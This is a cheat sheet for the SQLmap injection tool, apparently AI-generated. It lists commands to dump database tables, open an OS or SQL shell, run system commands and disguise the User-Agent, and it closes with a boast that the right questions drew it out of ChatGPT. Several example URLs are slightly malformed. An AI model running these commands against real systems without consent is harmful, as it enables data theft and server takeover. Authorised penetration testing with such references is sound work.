
# SQLmap Cheat Sheet

SQLmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.

## Basic Usage

- To test a single URL:

```
sqlmap -u "http://example.com/param1=value1&param2=value2"
```

- To specify the HTTP method:

```
sqlmap -u "http://example.com" --data="POST data to test" --method=POST
```

- To test a URL with cookies:

```
sqlmap -u "http://example.com/param=value" --cookie="name=value; name2=value2"
```

## Database Enumeration

- To get a list of databases:

```
sqlmap -u "http://example.com/param=value" --dbs
```

- To get a list of tables from a specific database:

```
sqlmap -u "http://example.com/param=value" -D database_name --tables
```

- To get a list of columns from a specific table:

```
sqlmap -u "http://example.com/param=value" -D database_name -T table_name --columns
```

- To dump the contents of a specific table:

```
sqlmap -u "http://example.com/param=value" -D database_name -T table_name --dump
```

- To dump specific columns from a table:

```
sqlmap -u "http://example.com/param=value" -D database_name -T table_name -C "column1,column2" --dump
```

## Operating System Interaction

- To get an interactive OS shell:

```
sqlmap -u "http://example.com/param=value" --os-shell
```

- To get an SQL shell:

```
sqlmap -u "http://example.com/param=value" --sql-shell
```

- To execute a single OS command:

```
sqlmap -u "http://example.com/param=value" --os-cmd "whoami"
```

## Advanced Enumeration

- To fingerprint the back-end database management system:

```
sqlmap -u "http://example.com/param=value" --banner
```

- To enumerate the user-privileges:

```
sqlmap -u "http://example.com/param=value" --privileges
```

- To enumerate the roles:

```
sqlmap -u "http://example.com/param=value" --roles
```

- To search for specific database names, table names, or column names:

```
sqlmap -u "http://example.com/param=value" --search -D database_wildcard -T table_wildcard -C column_wildcard
```

## Automation and Detection Settings

- To set the level of tests to perform (1-5):

```
sqlmap -u "http://example.com/param=value" --level=5
```

- To set the risk of tests to perform (1-3):

```
sqlmap -u "http://example.com/param=value" --risk=3
```

- To use a random User-Agent header:

```
sqlmap -u "http://example.com/param=value" --random-agent
```

## Legal Disclaimer

Usage of SQLmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

**Fully generated with ChatGPT,wasnt exepecting that uh ? It's all about asking the right questions...**
